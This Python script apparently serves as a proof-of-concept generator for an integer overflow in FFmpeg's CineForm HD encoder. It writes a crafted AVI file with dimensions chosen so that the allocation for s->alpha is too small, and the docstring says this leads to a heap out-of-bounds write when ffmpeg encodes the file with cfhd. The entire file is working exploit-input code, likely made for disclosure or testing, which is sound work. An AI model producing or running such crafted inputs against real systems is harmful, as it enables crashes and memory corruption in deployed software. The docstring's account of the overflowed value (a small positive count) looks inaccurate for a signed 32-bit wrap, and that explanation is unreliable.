#!/usr/bin/env python3
"""
VULN 002 PoC generator: Integer Overflow in s->alpha Allocation in cfhd_encode_init()

When width=46336 and height=46352 (both multiples of 16):
  46336 * 46352 = 2,147,766,272 > INT_MAX (2,147,483,647)
The multiplication overflows int32, yielding a small value (~282624).
av_calloc uses that small count, severely under-allocating s->alpha.
Then process_alpha() writes width*height int16_t elements -> massive heap OOB write.

We craft an AVI with DIB (raw BGR24) at W=46336, H=46352 with a tiny stub frame.
ffmpeg decodes it, then -pix_fmt gbrap12le converts to GBRAP12 (4 planes), and
-c:v cfhd triggers cfhd_encode_init() with s->planes==4.
"""
import struct

W = 46336
H = 46352

def chunk(fourcc, data):
    cc = fourcc.encode() if isinstance(fourcc, str) else fourcc
    return cc + struct.pack('<I', len(data)) + data

def list_chunk(listtype, fourcc, inner_data):
    lt = listtype.encode() if isinstance(listtype, str) else listtype
    fc = fourcc.encode() if isinstance(fourcc, str) else fourcc
    inner = fc + inner_data
    return lt + struct.pack('<I', len(inner)) + inner

# AVI Main Header (avih) - 56 bytes / 14 DWORDs
avih_data = struct.pack('<14I',
    33333,   # dwMicroSecPerFrame
    0,       # dwMaxBytesPerSec
    0,       # dwPaddingGranularity
    0x10,    # dwFlags (AVIF_HASINDEX not set, just non-interleaved)
    1,       # dwTotalFrames
    0,       # dwInitialFrames
    1,       # dwStreams
    0,       # dwSuggestedBufferSize
    W,       # dwWidth
    H,       # dwHeight
    0, 0, 0, 0  # dwReserved
)

# Stream Header (strh) for video
strh_data = struct.pack('<4s4sIHHIIIIIIII4H',
    b'vids',   # fccType
    b'DIB ',   # fccHandler (raw/uncompressed)
    0,         # dwFlags
    0,         # wPriority
    0,         # wLanguage
    0,         # dwInitialFrames
    1,         # dwScale
    30,        # dwRate  -> 30fps
    0,         # dwStart
    1,         # dwLength (1 frame)
    0,         # dwSuggestedBufferSize
    0xFFFFFFFF,# dwQuality
    0,         # dwSampleSize
    0, 0, W, H # rcFrame
)

# BITMAPINFOHEADER for DIB (uncompressed BGR24)
strf_data = struct.pack('<IiiHHIIiiII',
    40,    # biSize
    W,     # biWidth
    H,     # biHeight (positive = bottom-up)
    1,     # biPlanes
    24,    # biBitCount  (24-bit BGR)
    0,     # biCompression (BI_RGB)
    0,     # biSizeImage (can be 0 for BI_RGB)
    0,     # biXPelsPerMeter
    0,     # biYPelsPerMeter
    0,     # biClrUsed
    0      # biClrImportant
)

strl_inner = chunk('strh', strh_data) + chunk('strf', strf_data)
strl = list_chunk('LIST', 'strl', strl_inner)
hdrl_inner = chunk('avih', avih_data) + strl
hdrl = list_chunk('LIST', 'hdrl', hdrl_inner)

# Minimal frame data (just a few bytes - ffmpeg will error on decode but
# the encoder init path with integer overflow occurs first)
frame_data = b'\x00' * 48  # tiny stub
movi_inner = chunk('00dc', frame_data)
movi = list_chunk('LIST', 'movi', movi_inner)

riff_inner = b'AVI ' + hdrl + movi
riff = b'RIFF' + struct.pack('<I', len(riff_inner)) + riff_inner

out = 'vuln_002_input.avi'
with open(out, 'wb') as f:
    f.write(riff)

print(f"Generated {out} ({len(riff)} bytes)")
print(f"  W={W}, H={H}, W*H={W*H} (as int32: {(W*H) & 0xFFFFFFFF} = {(W*H) % (2**32) if (W*H) > 2**31-1 else W*H})")
print(f"  INT_MAX = {2**31 - 1}")
print(f"  Overflow: {W*H > 2**31 - 1}")
